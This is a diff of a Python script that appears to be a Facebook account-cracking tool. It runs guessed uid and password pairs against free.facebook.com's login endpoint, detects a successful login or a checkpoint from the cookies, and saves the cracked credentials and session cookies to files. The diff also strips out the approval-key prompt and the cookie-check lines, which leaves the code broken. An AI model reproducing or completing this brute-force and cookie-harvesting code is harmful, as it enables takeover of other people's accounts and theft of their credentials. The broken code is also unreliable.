@@ -245,15 +245,11 @@ def rcrack1(uid,pwx,tl):
           'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f"\033[38;5;46m[PROTIK MONDAL -OK] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
 #              print(f"\x1b[38;5;196m[PROTIK MONDAL -CP💔] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -CP.txt', 'a').write( uid+' | '+ps+' \n')
@@ -278,21 +274,9 @@ def shoha_menu():
         os.system("clear")
         os.system("xdg-open https://www.facebook.com/protik.mondal.52459/")
         time.sleep(3.0)
-        
         os.system("clear")
         print(logo)
-        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
-        print ("")
         print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Free because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
-        print ("")
-        print("                Your Key is Approved ")
-        print("               Copy And Send Key")
-        print ("")
-        print (" Your Key : "+UMO+id)
-        print ("\n")
-        name = input(" Your Name : ")
-        print ("")
-        input(" Press Enter Key")
         os.system("xdg-open :https://www.facebook.com/protik.mondal.52459/")
         shoha_menu()   
 shoha_menu()
